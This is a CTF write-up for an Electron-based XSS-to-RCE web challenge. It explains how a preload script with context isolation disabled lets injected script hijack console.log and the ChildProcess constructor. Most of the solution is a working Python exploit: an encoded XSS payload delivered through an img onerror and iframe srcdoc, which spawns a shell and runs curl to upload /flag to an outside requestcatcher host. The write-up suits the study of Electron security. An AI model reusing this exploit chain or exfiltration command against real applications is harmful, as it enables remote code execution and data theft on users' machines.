https://ctftime.org/event/2377

Could not solve during the ctf but was very close.

# elec (web)

This is a classic xss -> report challenge but it uses a electron app instead of a puppeteer script.

## Solution

The xss happens on `/article/:id` and there are some limits to it by the CSP
```go
Content-Security-Policy", "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://esm.sh 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
```

```javascript
const win = new BrowserWindow({
	width: 800,
	height: 600,
	webPreferences: {
		preload: path.join(__dirname, "preload.js"),
		contextIsolation: false,
		sandbox: false,
	},
});
```
electron window options:
- no nodeIntegration so we cant just do require('child_process')
- contextIsolation so if we set something in preload it will show in renderer
- more details:
    - https://www.electronjs.org/docs/latest/

```javascript
window.addEventListener("load", async () => {
	const versions = {
		app: "0.0.1",
		node: process.versions.node,
		chrome: process.versions.chrome,
		electron: process.versions.electron,
	};
	console.log(versions);

	const cp = spawn("uname", ["-a"]);
	console.log(cp);
	const kernelInfo = await loadStream(cp.stdout);

	document.getElementById("app-version").textContent = versions.app;
	document.getElementById("node-version").textContent = versions.node;
	document.getElementById("chrome-version").textContent = versions.chrome;
	document.getElementById("electron-version").textContent = versions.electron;
	document.getElementById("kernel-info").textContent = kernelInfo.toString();
	document.getElementById("admin-footer").classList.remove("d-none");
});
```
this is the preload script, the main vulnerability in this is that stuff can be overwritten from the xss. so if we set `document.getElementById = alert` an alert will popup.
there are 2 problems, the flag is in a file and `connect-src 'self'` so we need an rce.

looking at interesting stuff to overwrite, we see `console.log` being called with an instance of `ChildProcess`
so we overwrite that and call its constructor and just curl the flag

```python
#!/usr/bin/env python3
import requests
import base64
import re
import urllib

REMOTE = "http://0.0.0.0:1323/"

payload = """
<script//type="module">
var console = (function(oldCons){
    return {
        log: function(text){
            if (text.spawnfile) {
                const cp2 = new text.constructor();
                cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@/flag', 'https://lalalalalallalala.requestcatcher.com/'] });
                return oldCons.log(text);
            }

            oldCons.log(text);
        },
    };
}(window.console));

window.parent.console = console;
</script>
""".replace("\n", "").replace(" ", "&nbsp;").replace("<", "&lt;").replace(">", "&gt;")
payload = base64.b64encode(payload.encode()).decode()

body = f"""<img src=x onerror='javascript:a="{payload}";document.getElementById("content").innerHTML="<iframe srcdoc="+atob(a)+"></iframe>"'>"""
print(body)

res = requests.post(REMOTE, data={
        'title':body,
        'content':body
    })

try:
    url = re.search('action="(.+?)"', res.text).group(1)
    print(f"{REMOTE+url.replace('/report','article')}")
except Exception as e:
    print("error")

res = requests.post(REMOTE + url)
```

## Flag
`FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}`

shafouz 2024/06/23
